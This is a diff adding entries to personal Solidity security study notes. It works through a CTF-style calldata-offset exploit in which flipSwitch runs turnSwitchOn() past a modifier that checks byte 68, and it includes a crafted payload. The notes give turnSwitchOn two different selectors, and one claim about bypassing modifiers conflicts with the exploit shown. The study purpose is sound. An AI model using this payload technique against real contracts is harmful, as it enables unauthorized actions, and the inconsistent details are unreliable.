@@ -574,3 +574,105 @@ THEY RESULT IN UNDERFLOWS, USE SAFEMATH IF NEED BE
 Chainlink feeds can become stale if no new price updates have occurred for a significant period, which may result in outdated or inaccurate price information being used by the protocol. 
 The Chainlink interface provides updatedAt and answeredInRound fields specifically to help consumers detect stale or incomplete data, but these are ignored in the current implementation.
 Recommended Mitigation: Implement a staleness check in the getPrice function. For example, require that updatedAt is within an acceptable time window (e.g., not older than a configurable threshold) and that answeredInRound >= roundId. If the data is stale, revert or return an error.
+
+# 17. 
+0x30c13ade                    // flipSwitch(bytes) selector
+0000000000000000000000000000000000000000000000000000000000000020 // offset to data
+0000000000000000000000000000000000000000000000000000000000000004 // length of data
+20606e1500000000000000000000000000000000000000000000000000000000 // turnSwitchOff() selector
+
+[function selector][offset][length][actual data]
+     4 bytes       32 bytes 32 bytes  32 bytes (padded)
+
+Think of it like:
+"Hey contract, call flipSwitch()"
+"The parameter is located 32 bytes ahead"
+"That parameter is 4 bytes long"
+"The parameter value is 0x20606e15"
+
+Calling two functions within the same low level call
+
+0x30c13ade                                          // flipSwitch(bytes) selector
+0000000000000000000000000000000000000000000000000000000000000060 // new offset (now 0x60)
+0000000000000000000000000000000000000000000000000000000000000004 // length of turnSwitchOff
+20606e1500000000000000000000000000000000000000000000000000000000 // turnSwitchOff() selector
+0000000000000000000000000000000000000000000000000000000000000004 // length of turnSwitchOn
+76227e1200000000000000000000000000000000000000000000000000000000 // turnSwitchOn() selector
+
+bytes memory payload = bytes.concat(
+  bytes4(keccak256("flipSwitch(bytes)")),         // [0-3]
+  bytes32(uint256(0x60)),                         // [4-35] offset to _data (96 bytes)
+  bytes32(uint256(4)),                            // [36-67] length of first call
+  bytes32(bytes4(keccak256("turnSwitchOff()"))), // [68-99] turnSwitchOff selector
+  bytes32(uint256(4)),                            // [100-131] length of second call
+  bytes4(keccak256("turnSwitchOn()"))            // [132-135] turnSwitchOn selector (no padding required)
+);
+
+// Create the payload bytes
+bytes memory payload = bytes.concat(
+    // [0x00 - 0x03] Function selector: targetFunction(bytes,bytes)
+    bytes4(keccak256("targetFunction(bytes,bytes)")),
+
+    // [0x04 - 0x23] Offset to first dynamic argument (selector1) = 0x40 (64 bytes)
+    bytes32(uint256(0x40)),
+
+    // [0x24 - 0x43] Offset to second dynamic argument (selector2 with array) = 0x80 (128 bytes)
+    bytes32(uint256(0x80)),
+
+    // - First Dynamic Argument (Selector1) -
+
+    // [0x44 - 0x63] Length of selector1 (4 bytes)
+    bytes32(uint256(4)),
+
+    // [0x64 - 0x83] Selector1: function1()
+    bytes32(bytes4(keccak256("function1()"))),
+
+    // - Second Dynamic Argument (Selector2 + array) -
+
+    // [0x84 - 0xa3] Length of selector2 payload (4 bytes)
+    bytes32(uint256(4)),
+
+    // [0xa4 - 0xc3] Selector2: function2(uint256[])
+    bytes32(bytes4(keccak256("function2(uint256[])"))),
+
+    // [0xc4 - 0xe3] Offset to the array data within selector2 payload = 0x20 (32 bytes)
+    bytes32(uint256(0x20)),
+
+    // [0xe4 - 0x103] Length of array: 1 element
+    bytes32(uint256(1)),
+
+    // [0x104 - 0x123] foo[0] = 42
+    bytes32(uint256(42))
+);
+
+# 18.
+
+assembly {
+    calldatacopy(selector, 68, 4) // ALWAYS checks byte 68!
+}
+```
+
+It **hardcodes position 68** instead of reading from the offset pointer. This assumes the data will always be at a fixed location.
+
+## How Your Exploit Works
+
+Your payload structure:
+```
+[0-3]     0x30c13ade              // flipSwitch(bytes) selector
+[4-35]    0x0...060               // offset = 96 (points to byte 100!)
+[36-67]   0x0...004               // fake length = 4
+[68-99]   0x20606e15...           // turnSwitchOff() - MODIFIER READS THIS ✓
+[100-131] 0x0...004               // real length = 4  
+[132-135] 0x0d9ea16f              // turnSwitchOn() - ACTUAL DATA EXECUTED ✓
+
+# 19. 
+The **only** way to bypass modifiers is with `delegatecall` from a different context, or internal calls within the same contract.
+
+# 20.
+Furthermore, any contract can fake any error by returning data that matches an error signature, even if the error is not defined anywhere.
+
+
+# 21.
+In order to use low level functions like call, delegatecall, always wrap the contract in the address wrapper, its an address only function ie `address(target).call`
+
+
